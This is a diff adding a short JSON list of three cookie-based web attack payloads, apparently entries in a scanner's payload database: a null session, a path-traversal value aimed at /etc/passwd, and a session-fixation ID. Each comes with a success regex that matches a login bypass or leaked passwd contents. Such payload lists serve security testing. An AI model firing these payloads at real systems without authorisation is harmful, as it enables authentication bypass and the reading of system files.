@@ -1,0 +1,35 @@
+[
+  {
+    "payload_id": "OWP-0946",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "cookie",
+    "payload_string": "session=; (null session)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0947",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "cookie",
+    "payload_string": "session=../../../etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|root:"
+    }
+  },
+  {
+    "payload_id": "OWP-0948",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "cookie",
+    "payload_string": "session=fixedSessionID001 (session fixation)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|root:"
+    }
+  }
+]
